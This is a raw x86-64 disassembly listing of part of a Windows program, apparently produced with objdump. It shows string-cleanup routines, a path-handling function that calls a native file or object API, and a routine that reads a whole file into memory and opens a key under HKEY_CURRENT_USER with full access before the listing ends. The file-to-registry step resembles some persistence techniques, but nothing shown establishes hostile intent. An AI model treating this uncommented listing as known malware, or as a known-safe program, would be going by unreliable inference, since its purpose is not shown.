   140002512:	48 83 f8 1f          	cmp    $0x1f,%rax
   140002516:	76 07                	jbe    0x14000251f
   140002518:	ff 15 f2 2c 00 00    	call   *0x2cf2(%rip)        # 0x140005210
   14000251e:	cc                   	int3
   14000251f:	e8 18 1b 00 00       	call   0x14000403c
   140002524:	66 0f 6f 05 64 33 00 	movdqa 0x3364(%rip),%xmm0        # 0x140005890
   14000252b:	00 
   14000252c:	f3 0f 7f 45 af       	movdqu %xmm0,-0x51(%rbp)
   140002531:	66 44 89 7d 9f       	mov    %r15w,-0x61(%rbp)
   140002536:	48 8b 55 0f          	mov    0xf(%rbp),%rdx
   14000253a:	48 83 fa 07          	cmp    $0x7,%rdx
   14000253e:	76 39                	jbe    0x140002579
   140002540:	48 8d 14 55 02 00 00 	lea    0x2(,%rdx,2),%rdx
   140002547:	00 
   140002548:	48 8b 4d f7          	mov    -0x9(%rbp),%rcx
   14000254c:	48 8b c1             	mov    %rcx,%rax
   14000254f:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140002556:	72 1c                	jb     0x140002574
   140002558:	48 83 c2 27          	add    $0x27,%rdx
   14000255c:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   140002560:	48 2b c1             	sub    %rcx,%rax
   140002563:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   140002567:	48 83 f8 1f          	cmp    $0x1f,%rax
   14000256b:	76 07                	jbe    0x140002574
   14000256d:	ff 15 9d 2c 00 00    	call   *0x2c9d(%rip)        # 0x140005210
   140002573:	cc                   	int3
   140002574:	e8 c3 1a 00 00       	call   0x14000403c
   140002579:	66 0f 6f 05 0f 33 00 	movdqa 0x330f(%rip),%xmm0        # 0x140005890
   140002580:	00 
   140002581:	f3 0f 7f 45 07       	movdqu %xmm0,0x7(%rbp)
   140002586:	66 44 89 7d f7       	mov    %r15w,-0x9(%rbp)
   14000258b:	48 8b 56 28          	mov    0x28(%rsi),%rdx
   14000258f:	48 83 fa 07          	cmp    $0x7,%rdx
   140002593:	76 32                	jbe    0x1400025c7
   140002595:	48 8d 14 55 02 00 00 	lea    0x2(,%rdx,2),%rdx
   14000259c:	00 
   14000259d:	48 8b 4e 10          	mov    0x10(%rsi),%rcx
   1400025a1:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   1400025a8:	72 18                	jb     0x1400025c2
   1400025aa:	48 83 c2 27          	add    $0x27,%rdx
   1400025ae:	4c 8b 41 f8          	mov    -0x8(%rcx),%r8
   1400025b2:	49 2b c8             	sub    %r8,%rcx
   1400025b5:	48 8d 41 f8          	lea    -0x8(%rcx),%rax
   1400025b9:	48 83 f8 1f          	cmp    $0x1f,%rax
   1400025bd:	77 3f                	ja     0x1400025fe
   1400025bf:	49 8b c8             	mov    %r8,%rcx
   1400025c2:	e8 75 1a 00 00       	call   0x14000403c
   1400025c7:	49 8b c6             	mov    %r14,%rax
   1400025ca:	66 44 89 7e 10       	mov    %r15w,0x10(%rsi)
   1400025cf:	48 c7 46 28 07 00 00 	movq   $0x7,0x28(%rsi)
   1400025d6:	00 
   1400025d7:	4c 89 7e 20          	mov    %r15,0x20(%rsi)
   1400025db:	48 8b 4d 27          	mov    0x27(%rbp),%rcx
   1400025df:	48 33 cc             	xor    %rsp,%rcx
   1400025e2:	e8 b9 17 00 00       	call   0x140003da0
   1400025e7:	48 8b 9c 24 10 01 00 	mov    0x110(%rsp),%rbx
   1400025ee:	00 
   1400025ef:	48 81 c4 d0 00 00 00 	add    $0xd0,%rsp
   1400025f6:	41 5f                	pop    %r15
   1400025f8:	41 5e                	pop    %r14
   1400025fa:	5f                   	pop    %rdi
   1400025fb:	5e                   	pop    %rsi
   1400025fc:	5d                   	pop    %rbp
   1400025fd:	c3                   	ret
   1400025fe:	ff 15 0c 2c 00 00    	call   *0x2c0c(%rip)        # 0x140005210
   140002604:	cc                   	int3
   140002605:	cc                   	int3
   140002606:	cc                   	int3
   140002607:	cc                   	int3
   140002608:	cc                   	int3
   140002609:	cc                   	int3
   14000260a:	cc                   	int3
   14000260b:	cc                   	int3
   14000260c:	cc                   	int3
   14000260d:	cc                   	int3
   14000260e:	cc                   	int3
   14000260f:	cc                   	int3
   140002610:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140002615:	57                   	push   %rdi
   140002616:	48 83 ec 20          	sub    $0x20,%rsp
   14000261a:	48 8b 51 60          	mov    0x60(%rcx),%rdx
   14000261e:	48 8b d9             	mov    %rcx,%rbx
   140002621:	48 83 fa 07          	cmp    $0x7,%rdx
   140002625:	76 32                	jbe    0x140002659
   140002627:	48 8b 49 48          	mov    0x48(%rcx),%rcx
   14000262b:	48 8d 14 55 02 00 00 	lea    0x2(,%rdx,2),%rdx
   140002632:	00 
   140002633:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   14000263a:	72 18                	jb     0x140002654
   14000263c:	4c 8b 41 f8          	mov    -0x8(%rcx),%r8
   140002640:	48 83 c2 27          	add    $0x27,%rdx
   140002644:	49 2b c8             	sub    %r8,%rcx
   140002647:	48 8d 41 f8          	lea    -0x8(%rcx),%rax
   14000264b:	48 83 f8 1f          	cmp    $0x1f,%rax
   14000264f:	77 71                	ja     0x1400026c2
   140002651:	49 8b c8             	mov    %r8,%rcx
   140002654:	e8 e3 19 00 00       	call   0x14000403c
   140002659:	33 ff                	xor    %edi,%edi
   14000265b:	48 c7 43 60 07 00 00 	movq   $0x7,0x60(%rbx)
   140002662:	00 
   140002663:	48 89 7b 58          	mov    %rdi,0x58(%rbx)
   140002667:	66 89 7b 48          	mov    %di,0x48(%rbx)
   14000266b:	48 8b 53 28          	mov    0x28(%rbx),%rdx
   14000266f:	48 83 fa 07          	cmp    $0x7,%rdx
   140002673:	76 32                	jbe    0x1400026a7
   140002675:	48 8b 4b 10          	mov    0x10(%rbx),%rcx
   140002679:	48 8d 14 55 02 00 00 	lea    0x2(,%rdx,2),%rdx
   140002680:	00 
   140002681:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140002688:	72 18                	jb     0x1400026a2
   14000268a:	4c 8b 41 f8          	mov    -0x8(%rcx),%r8
   14000268e:	48 83 c2 27          	add    $0x27,%rdx
   140002692:	49 2b c8             	sub    %r8,%rcx
   140002695:	48 8d 41 f8          	lea    -0x8(%rcx),%rax
   140002699:	48 83 f8 1f          	cmp    $0x1f,%rax
   14000269d:	77 23                	ja     0x1400026c2
   14000269f:	49 8b c8             	mov    %r8,%rcx
   1400026a2:	e8 95 19 00 00       	call   0x14000403c
   1400026a7:	48 89 7b 20          	mov    %rdi,0x20(%rbx)
   1400026ab:	48 c7 43 28 07 00 00 	movq   $0x7,0x28(%rbx)
   1400026b2:	00 
   1400026b3:	66 89 7b 10          	mov    %di,0x10(%rbx)
   1400026b7:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   1400026bc:	48 83 c4 20          	add    $0x20,%rsp
   1400026c0:	5f                   	pop    %rdi
   1400026c1:	c3                   	ret
   1400026c2:	ff 15 48 2b 00 00    	call   *0x2b48(%rip)        # 0x140005210
   1400026c8:	cc                   	int3
   1400026c9:	cc                   	int3
   1400026ca:	cc                   	int3
   1400026cb:	cc                   	int3
   1400026cc:	cc                   	int3
   1400026cd:	cc                   	int3
   1400026ce:	cc                   	int3
   1400026cf:	cc                   	int3
   1400026d0:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   1400026d5:	55                   	push   %rbp
   1400026d6:	56                   	push   %rsi
   1400026d7:	57                   	push   %rdi
   1400026d8:	41 56                	push   %r14
   1400026da:	41 57                	push   %r15
   1400026dc:	48 8d ac 24 10 ff ff 	lea    -0xf0(%rsp),%rbp
   1400026e3:	ff 
   1400026e4:	48 81 ec f0 01 00 00 	sub    $0x1f0,%rsp
   1400026eb:	48 8b 05 4e 59 00 00 	mov    0x594e(%rip),%rax        # 0x140008040
   1400026f2:	48 33 c4             	xor    %rsp,%rax
   1400026f5:	48 89 85 e0 00 00 00 	mov    %rax,0xe0(%rbp)
   1400026fc:	48 8b da             	mov    %rdx,%rbx
   1400026ff:	48 8b f9             	mov    %rcx,%rdi
   140002702:	48 89 4d 30          	mov    %rcx,0x30(%rbp)
   140002706:	48 89 55 38          	mov    %rdx,0x38(%rbp)
   14000270a:	48 8d 45 e8          	lea    -0x18(%rbp),%rax
   14000270e:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140002713:	0f 57 c0             	xorps  %xmm0,%xmm0
   140002716:	0f 11 45 f8          	movups %xmm0,-0x8(%rbp)
   14000271a:	45 33 ff             	xor    %r15d,%r15d
   14000271d:	4c 89 7d 08          	mov    %r15,0x8(%rbp)
   140002721:	48 c7 45 10 07 00 00 	movq   $0x7,0x10(%rbp)
   140002728:	00 
   140002729:	66 44 89 7d f8       	mov    %r15w,-0x8(%rbp)
   14000272e:	8b 41 30             	mov    0x30(%rcx),%eax
   140002731:	89 45 18             	mov    %eax,0x18(%rbp)
   140002734:	44 0f b7 01          	movzwl (%rcx),%r8d
   140002738:	48 8b 51 08          	mov    0x8(%rcx),%rdx
   14000273c:	48 8d 4d e8          	lea    -0x18(%rbp),%rcx
   140002740:	e8 ab eb ff ff       	call   0x1400012f0
   140002745:	90                   	nop
   140002746:	48 8d 55 e8          	lea    -0x18(%rbp),%rdx
   14000274a:	48 8d 4d 70          	lea    0x70(%rbp),%rcx
   14000274e:	e8 cd fa ff ff       	call   0x140002220
   140002753:	90                   	nop
   140002754:	48 8d 44 24 38       	lea    0x38(%rsp),%rax
   140002759:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   14000275e:	0f 57 c0             	xorps  %xmm0,%xmm0
   140002761:	0f 11 44 24 48       	movups %xmm0,0x48(%rsp)
   140002766:	4c 89 7c 24 58       	mov    %r15,0x58(%rsp)
   14000276b:	48 c7 44 24 60 07 00 	movq   $0x7,0x60(%rsp)
   140002772:	00 00 
   140002774:	66 44 89 7c 24 48    	mov    %r15w,0x48(%rsp)
   14000277a:	8b 85 a0 00 00 00    	mov    0xa0(%rbp),%eax
   140002780:	89 44 24 68          	mov    %eax,0x68(%rsp)
   140002784:	44 0f b7 45 70       	movzwl 0x70(%rbp),%r8d
   140002789:	48 8b 55 78          	mov    0x78(%rbp),%rdx
   14000278d:	48 8d 4c 24 38       	lea    0x38(%rsp),%rcx
   140002792:	e8 59 eb ff ff       	call   0x1400012f0
   140002797:	90                   	nop
   140002798:	48 8d 44 24 38       	lea    0x38(%rsp),%rax
   14000279d:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   1400027a2:	48 8d 4c 24 38       	lea    0x38(%rsp),%rcx
   1400027a7:	e8 b4 ed ff ff       	call   0x140001560
   1400027ac:	66 83 f8 5c          	cmp    $0x5c,%ax
   1400027b0:	75 2f                	jne    0x1400027e1
   1400027b2:	41 b9 fe ff 00 00    	mov    $0xfffe,%r9d
   1400027b8:	44 0f b7 44 24 38    	movzwl 0x38(%rsp),%r8d
   1400027be:	66 90                	xchg   %ax,%ax
   1400027c0:	66 41 83 f8 02       	cmp    $0x2,%r8w
   1400027c5:	72 0a                	jb     0x1400027d1
   1400027c7:	66 45 03 c1          	add    %r9w,%r8w
   1400027cb:	66 44 89 44 24 38    	mov    %r8w,0x38(%rsp)
   1400027d1:	48 8d 4c 24 38       	lea    0x38(%rsp),%rcx
   1400027d6:	e8 85 ed ff ff       	call   0x140001560
   1400027db:	66 83 f8 5c          	cmp    $0x5c,%ax
   1400027df:	74 df                	je     0x1400027c0
   1400027e1:	c7 45 40 30 00 00 00 	movl   $0x30,0x40(%rbp)
   1400027e8:	4c 89 7d 48          	mov    %r15,0x48(%rbp)
   1400027ec:	c7 45 58 40 00 00 00 	movl   $0x40,0x58(%rbp)
   1400027f3:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400027f6:	f3 0f 7f 45 60       	movdqu %xmm0,0x60(%rbp)
   1400027fb:	48 8d 44 24 38       	lea    0x38(%rsp),%rax
   140002800:	48 89 45 50          	mov    %rax,0x50(%rbp)
   140002804:	4c 89 7d 28          	mov    %r15,0x28(%rbp)
   140002808:	4c 8d 45 40          	lea    0x40(%rbp),%r8
   14000280c:	ba 02 00 00 00       	mov    $0x2,%edx
   140002811:	48 8d 4d 28          	lea    0x28(%rbp),%rcx
   140002815:	ff 15 3d 5f 00 00    	call   *0x5f3d(%rip)        # 0x140008758
   14000281b:	49 8b f7             	mov    %r15,%rsi
   14000281e:	85 c0                	test   %eax,%eax
   140002820:	48 0f 44 75 28       	cmove  0x28(%rbp),%rsi
   140002825:	48 8b 54 24 60       	mov    0x60(%rsp),%rdx
   14000282a:	48 83 fa 07          	cmp    $0x7,%rdx
   14000282e:	76 3a                	jbe    0x14000286a
   140002830:	48 8d 14 55 02 00 00 	lea    0x2(,%rdx,2),%rdx
   140002837:	00 
   140002838:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
   14000283d:	48 8b c1             	mov    %rcx,%rax
   140002840:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140002847:	72 1c                	jb     0x140002865
   140002849:	48 83 c2 27          	add    $0x27,%rdx
   14000284d:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   140002851:	48 2b c1             	sub    %rcx,%rax
   140002854:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   140002858:	48 83 f8 1f          	cmp    $0x1f,%rax
   14000285c:	76 07                	jbe    0x140002865
   14000285e:	ff 15 ac 29 00 00    	call   *0x29ac(%rip)        # 0x140005210
   140002864:	cc                   	int3
   140002865:	e8 d2 17 00 00       	call   0x14000403c
   14000286a:	4c 89 7c 24 58       	mov    %r15,0x58(%rsp)
   14000286f:	48 c7 44 24 60 07 00 	movq   $0x7,0x60(%rsp)
   140002876:	00 00 
   140002878:	66 44 89 7c 24 48    	mov    %r15w,0x48(%rsp)
   14000287e:	48 85 f6             	test   %rsi,%rsi
   140002881:	0f 85 a2 00 00 00    	jne    0x140002929
   140002887:	48 8d 4d 70          	lea    0x70(%rbp),%rcx
   14000288b:	e8 80 fd ff ff       	call   0x140002610
   140002890:	90                   	nop
   140002891:	48 8b 57 28          	mov    0x28(%rdi),%rdx
   140002895:	48 83 fa 07          	cmp    $0x7,%rdx
   140002899:	76 36                	jbe    0x1400028d1
   14000289b:	48 8b 4f 10          	mov    0x10(%rdi),%rcx
   14000289f:	48 8d 14 55 02 00 00 	lea    0x2(,%rdx,2),%rdx
   1400028a6:	00 
   1400028a7:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   1400028ae:	72 1c                	jb     0x1400028cc
   1400028b0:	48 83 c2 27          	add    $0x27,%rdx
   1400028b4:	4c 8b 41 f8          	mov    -0x8(%rcx),%r8
   1400028b8:	49 2b c8             	sub    %r8,%rcx
   1400028bb:	48 8d 41 f8          	lea    -0x8(%rcx),%rax
   1400028bf:	48 83 f8 1f          	cmp    $0x1f,%rax
   1400028c3:	0f 87 9f 02 00 00    	ja     0x140002b68
   1400028c9:	49 8b c8             	mov    %r8,%rcx
   1400028cc:	e8 6b 17 00 00       	call   0x14000403c
   1400028d1:	4c 89 7f 20          	mov    %r15,0x20(%rdi)
   1400028d5:	48 c7 47 28 07 00 00 	movq   $0x7,0x28(%rdi)
   1400028dc:	00 
   1400028dd:	66 44 89 7f 10       	mov    %r15w,0x10(%rdi)
   1400028e2:	48 8b 53 28          	mov    0x28(%rbx),%rdx
   1400028e6:	48 83 fa 07          	cmp    $0x7,%rdx
   1400028ea:	76 36                	jbe    0x140002922
   1400028ec:	48 8d 14 55 02 00 00 	lea    0x2(,%rdx,2),%rdx
   1400028f3:	00 
   1400028f4:	48 8b 4b 10          	mov    0x10(%rbx),%rcx
   1400028f8:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   1400028ff:	72 1c                	jb     0x14000291d
   140002901:	48 83 c2 27          	add    $0x27,%rdx
   140002905:	4c 8b 41 f8          	mov    -0x8(%rcx),%r8
   140002909:	49 2b c8             	sub    %r8,%rcx
   14000290c:	48 8d 41 f8          	lea    -0x8(%rcx),%rax
   140002910:	48 83 f8 1f          	cmp    $0x1f,%rax
   140002914:	0f 87 55 02 00 00    	ja     0x140002b6f
   14000291a:	49 8b c8             	mov    %r8,%rcx
   14000291d:	e8 1a 17 00 00       	call   0x14000403c
   140002922:	32 c0                	xor    %al,%al
   140002924:	e9 08 02 00 00       	jmp    0x140002b31
   140002929:	48 8d 44 24 70       	lea    0x70(%rsp),%rax
   14000292e:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140002933:	48 8d 45 b0          	lea    -0x50(%rbp),%rax
   140002937:	48 89 45 a8          	mov    %rax,-0x58(%rbp)
   14000293b:	0f 57 c0             	xorps  %xmm0,%xmm0
   14000293e:	0f 11 45 80          	movups %xmm0,-0x80(%rbp)
   140002942:	4c 89 7d 90          	mov    %r15,-0x70(%rbp)
   140002946:	48 c7 45 98 07 00 00 	movq   $0x7,-0x68(%rbp)
   14000294d:	00 
   14000294e:	66 44 89 7d 80       	mov    %r15w,-0x80(%rbp)
   140002953:	8b 43 30             	mov    0x30(%rbx),%eax
   140002956:	89 45 a0             	mov    %eax,-0x60(%rbp)
   140002959:	44 0f b7 03          	movzwl (%rbx),%r8d
   14000295d:	48 8b 53 08          	mov    0x8(%rbx),%rdx
   140002961:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140002966:	e8 85 e9 ff ff       	call   0x1400012f0
   14000296b:	90                   	nop
   14000296c:	48 8d 44 24 70       	lea    0x70(%rsp),%rax
   140002971:	48 89 45 20          	mov    %rax,0x20(%rbp)
   140002975:	0f 57 c0             	xorps  %xmm0,%xmm0
   140002978:	0f 11 45 c0          	movups %xmm0,-0x40(%rbp)
   14000297c:	4c 89 7d d0          	mov    %r15,-0x30(%rbp)
   140002980:	48 c7 45 d8 07 00 00 	movq   $0x7,-0x28(%rbp)
   140002987:	00 
   140002988:	66 44 89 7d c0       	mov    %r15w,-0x40(%rbp)
   14000298d:	8b 85 d8 00 00 00    	mov    0xd8(%rbp),%eax
   140002993:	89 45 e0             	mov    %eax,-0x20(%rbp)
   140002996:	44 0f b7 85 a8 00 00 	movzwl 0xa8(%rbp),%r8d
   14000299d:	00 
   14000299e:	48 8b 95 b0 00 00 00 	mov    0xb0(%rbp),%rdx
   1400029a5:	48 8d 4d b0          	lea    -0x50(%rbp),%rcx
   1400029a9:	e8 42 e9 ff ff       	call   0x1400012f0
   1400029ae:	90                   	nop
   1400029af:	48 8d 45 b0          	lea    -0x50(%rbp),%rax
   1400029b3:	48 89 45 a8          	mov    %rax,-0x58(%rbp)
   1400029b7:	0f b7 44 24 70       	movzwl 0x70(%rsp),%eax
   1400029bc:	89 44 24 28          	mov    %eax,0x28(%rsp)
   1400029c0:	48 8b 44 24 78       	mov    0x78(%rsp),%rax
   1400029c5:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400029ca:	44 8b 4d a0          	mov    -0x60(%rbp),%r9d
   1400029ce:	45 33 c0             	xor    %r8d,%r8d
   1400029d1:	48 8d 55 b0          	lea    -0x50(%rbp),%rdx
   1400029d5:	48 8b ce             	mov    %rsi,%rcx
   1400029d8:	ff 15 92 5d 00 00    	call   *0x5d92(%rip)        # 0x140008770
   1400029de:	85 c0                	test   %eax,%eax
   1400029e0:	41 0f 94 c6          	sete   %r14b
   1400029e4:	48 8b 55 d8          	mov    -0x28(%rbp),%rdx
   1400029e8:	48 83 fa 07          	cmp    $0x7,%rdx
   1400029ec:	76 39                	jbe    0x140002a27
   1400029ee:	48 8d 14 55 02 00 00 	lea    0x2(,%rdx,2),%rdx
   1400029f5:	00 
   1400029f6:	48 8b 4d c0          	mov    -0x40(%rbp),%rcx
   1400029fa:	48 8b c1             	mov    %rcx,%rax
   1400029fd:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140002a04:	72 1c                	jb     0x140002a22
   140002a06:	48 83 c2 27          	add    $0x27,%rdx
   140002a0a:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   140002a0e:	48 2b c1             	sub    %rcx,%rax
   140002a11:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   140002a15:	48 83 f8 1f          	cmp    $0x1f,%rax
   140002a19:	76 07                	jbe    0x140002a22
   140002a1b:	ff 15 ef 27 00 00    	call   *0x27ef(%rip)        # 0x140005210
   140002a21:	cc                   	int3
   140002a22:	e8 15 16 00 00       	call   0x14000403c
   140002a27:	4c 89 7d d0          	mov    %r15,-0x30(%rbp)
   140002a2b:	48 c7 45 d8 07 00 00 	movq   $0x7,-0x28(%rbp)
   140002a32:	00 
   140002a33:	66 44 89 7d c0       	mov    %r15w,-0x40(%rbp)
   140002a38:	48 8b 55 98          	mov    -0x68(%rbp),%rdx
   140002a3c:	48 83 fa 07          	cmp    $0x7,%rdx
   140002a40:	76 39                	jbe    0x140002a7b
   140002a42:	48 8d 14 55 02 00 00 	lea    0x2(,%rdx,2),%rdx
   140002a49:	00 
   140002a4a:	48 8b 4d 80          	mov    -0x80(%rbp),%rcx
   140002a4e:	48 8b c1             	mov    %rcx,%rax
   140002a51:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140002a58:	72 1c                	jb     0x140002a76
   140002a5a:	48 83 c2 27          	add    $0x27,%rdx
   140002a5e:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   140002a62:	48 2b c1             	sub    %rcx,%rax
   140002a65:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   140002a69:	48 83 f8 1f          	cmp    $0x1f,%rax
   140002a6d:	76 07                	jbe    0x140002a76
   140002a6f:	ff 15 9b 27 00 00    	call   *0x279b(%rip)        # 0x140005210
   140002a75:	cc                   	int3
   140002a76:	e8 c1 15 00 00       	call   0x14000403c
   140002a7b:	4c 89 7d 90          	mov    %r15,-0x70(%rbp)
   140002a7f:	48 c7 45 98 07 00 00 	movq   $0x7,-0x68(%rbp)
   140002a86:	00 
   140002a87:	66 44 89 7d 80       	mov    %r15w,-0x80(%rbp)
   140002a8c:	48 8b ce             	mov    %rsi,%rcx
   140002a8f:	ff 15 cb 5c 00 00    	call   *0x5ccb(%rip)        # 0x140008760
   140002a95:	90                   	nop
   140002a96:	48 8d 4d 70          	lea    0x70(%rbp),%rcx
   140002a9a:	e8 71 fb ff ff       	call   0x140002610
   140002a9f:	90                   	nop
   140002aa0:	48 8b 57 28          	mov    0x28(%rdi),%rdx
   140002aa4:	48 83 fa 07          	cmp    $0x7,%rdx
   140002aa8:	76 36                	jbe    0x140002ae0
   140002aaa:	48 8b 4f 10          	mov    0x10(%rdi),%rcx
   140002aae:	48 8d 14 55 02 00 00 	lea    0x2(,%rdx,2),%rdx
   140002ab5:	00 
   140002ab6:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140002abd:	72 1c                	jb     0x140002adb
   140002abf:	48 83 c2 27          	add    $0x27,%rdx
   140002ac3:	4c 8b 41 f8          	mov    -0x8(%rcx),%r8
   140002ac7:	49 2b c8             	sub    %r8,%rcx
   140002aca:	48 8d 41 f8          	lea    -0x8(%rcx),%rax
   140002ace:	48 83 f8 1f          	cmp    $0x1f,%rax
   140002ad2:	0f 87 90 00 00 00    	ja     0x140002b68
   140002ad8:	49 8b c8             	mov    %r8,%rcx
   140002adb:	e8 5c 15 00 00       	call   0x14000403c
   140002ae0:	4c 89 7f 20          	mov    %r15,0x20(%rdi)
   140002ae4:	48 c7 47 28 07 00 00 	movq   $0x7,0x28(%rdi)
   140002aeb:	00 
   140002aec:	66 44 89 7f 10       	mov    %r15w,0x10(%rdi)
   140002af1:	48 8b 53 28          	mov    0x28(%rbx),%rdx
   140002af5:	48 83 fa 07          	cmp    $0x7,%rdx
   140002af9:	76 32                	jbe    0x140002b2d
   140002afb:	48 8d 14 55 02 00 00 	lea    0x2(,%rdx,2),%rdx
   140002b02:	00 
   140002b03:	48 8b 4b 10          	mov    0x10(%rbx),%rcx
   140002b07:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140002b0e:	72 18                	jb     0x140002b28
   140002b10:	48 83 c2 27          	add    $0x27,%rdx
   140002b14:	4c 8b 41 f8          	mov    -0x8(%rcx),%r8
   140002b18:	49 2b c8             	sub    %r8,%rcx
   140002b1b:	48 8d 41 f8          	lea    -0x8(%rcx),%rax
   140002b1f:	48 83 f8 1f          	cmp    $0x1f,%rax
   140002b23:	77 4a                	ja     0x140002b6f
   140002b25:	49 8b c8             	mov    %r8,%rcx
   140002b28:	e8 0f 15 00 00       	call   0x14000403c
   140002b2d:	41 0f b6 c6          	movzbl %r14b,%eax
   140002b31:	66 44 89 7b 10       	mov    %r15w,0x10(%rbx)
   140002b36:	48 c7 43 28 07 00 00 	movq   $0x7,0x28(%rbx)
   140002b3d:	00 
   140002b3e:	4c 89 7b 20          	mov    %r15,0x20(%rbx)
   140002b42:	48 8b 8d e0 00 00 00 	mov    0xe0(%rbp),%rcx
   140002b49:	48 33 cc             	xor    %rsp,%rcx
   140002b4c:	e8 4f 12 00 00       	call   0x140003da0
   140002b51:	48 8b 9c 24 30 02 00 	mov    0x230(%rsp),%rbx
   140002b58:	00 
   140002b59:	48 81 c4 f0 01 00 00 	add    $0x1f0,%rsp
   140002b60:	41 5f                	pop    %r15
   140002b62:	41 5e                	pop    %r14
   140002b64:	5f                   	pop    %rdi
   140002b65:	5e                   	pop    %rsi
   140002b66:	5d                   	pop    %rbp
   140002b67:	c3                   	ret
   140002b68:	ff 15 a2 26 00 00    	call   *0x26a2(%rip)        # 0x140005210
   140002b6e:	90                   	nop
   140002b6f:	ff 15 9b 26 00 00    	call   *0x269b(%rip)        # 0x140005210
   140002b75:	cc                   	int3
   140002b76:	cc                   	int3
   140002b77:	cc                   	int3
   140002b78:	cc                   	int3
   140002b79:	cc                   	int3
   140002b7a:	cc                   	int3
   140002b7b:	cc                   	int3
   140002b7c:	cc                   	int3
   140002b7d:	cc                   	int3
   140002b7e:	cc                   	int3
   140002b7f:	cc                   	int3
   140002b80:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002b85:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140002b8a:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   140002b8f:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   140002b94:	55                   	push   %rbp
   140002b95:	48 8d 6c 24 c0       	lea    -0x40(%rsp),%rbp
   140002b9a:	48 81 ec 40 01 00 00 	sub    $0x140,%rsp
   140002ba1:	48 8b 05 98 54 00 00 	mov    0x5498(%rip),%rax        # 0x140008040
   140002ba8:	48 33 c4             	xor    %rsp,%rax
   140002bab:	48 89 45 30          	mov    %rax,0x30(%rbp)
   140002baf:	8b 05 93 29 00 00    	mov    0x2993(%rip),%eax        # 0x140005548
   140002bb5:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   140002bb9:	0f 10 05 78 29 00 00 	movups 0x2978(%rip),%xmm0        # 0x140005538
   140002bc0:	45 33 f6             	xor    %r14d,%r14d
   140002bc3:	89 45 28             	mov    %eax,0x28(%rbp)
   140002bc6:	0f b7 05 7f 29 00 00 	movzwl 0x297f(%rip),%eax        # 0x14000554c
   140002bcd:	45 33 c9             	xor    %r9d,%r9d
   140002bd0:	4c 89 74 24 30       	mov    %r14,0x30(%rsp)
   140002bd5:	ba 00 00 00 80       	mov    $0x80000000,%edx
   140002bda:	44 89 74 24 28       	mov    %r14d,0x28(%rsp)
   140002bdf:	45 8d 46 01          	lea    0x1(%r14),%r8d
   140002be3:	66 89 45 2c          	mov    %ax,0x2c(%rbp)
   140002be7:	0f 11 45 18          	movups %xmm0,0x18(%rbp)
   140002beb:	c7 44 24 20 03 00 00 	movl   $0x3,0x20(%rsp)
   140002bf2:	00 
   140002bf3:	ff 15 27 24 00 00    	call   *0x2427(%rip)        # 0x140005020
   140002bf9:	48 8b c8             	mov    %rax,%rcx
   140002bfc:	33 d2                	xor    %edx,%edx
   140002bfe:	48 8b d8             	mov    %rax,%rbx
   140002c01:	ff 15 39 24 00 00    	call   *0x2439(%rip)        # 0x140005040
   140002c07:	8b d0                	mov    %eax,%edx
   140002c09:	33 c9                	xor    %ecx,%ecx
   140002c0b:	45 8d 4e 04          	lea    0x4(%r14),%r9d
   140002c0f:	8b f8                	mov    %eax,%edi
   140002c11:	41 b8 00 10 00 00    	mov    $0x1000,%r8d
   140002c17:	ff 15 1b 24 00 00    	call   *0x241b(%rip)        # 0x140005038
   140002c1d:	4c 8d 4d 10          	lea    0x10(%rbp),%r9
   140002c21:	44 89 75 10          	mov    %r14d,0x10(%rbp)
   140002c25:	48 8b d0             	mov    %rax,%rdx
   140002c28:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   140002c2d:	44 8b c7             	mov    %edi,%r8d
   140002c30:	48 8b cb             	mov    %rbx,%rcx
   140002c33:	48 8b f0             	mov    %rax,%rsi
   140002c36:	ff 15 14 24 00 00    	call   *0x2414(%rip)        # 0x140005050
   140002c3c:	48 8d 45 08          	lea    0x8(%rbp),%rax
   140002c40:	41 b9 3f 00 0f 00    	mov    $0xf003f,%r9d
   140002c46:	45 33 c0             	xor    %r8d,%r8d
   140002c49:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140002c4e:	48 8d 15 fb 28 00 00 	lea    0x28fb(%rip),%rdx        # 0x140005550
   140002c55:	48 c7 c1 01 00 00 80 	mov    $0xffffffff80000001,%rcx
   140002c5c:	ff 15 9e 23 00 00    	call   *0x239e(%rip)        # 0x140005000
   140002c62:	85 c0                	test   %eax,%eax
   140002c64:	0f 85 46 01 00 00    	jne    0x140002db0
   140002c6a:	48 8b 4d 08          	mov    0x8(%rbp),%rcx
   140002c6e:	45 8d 4e 03          	lea    0x3(%r14),%r9d
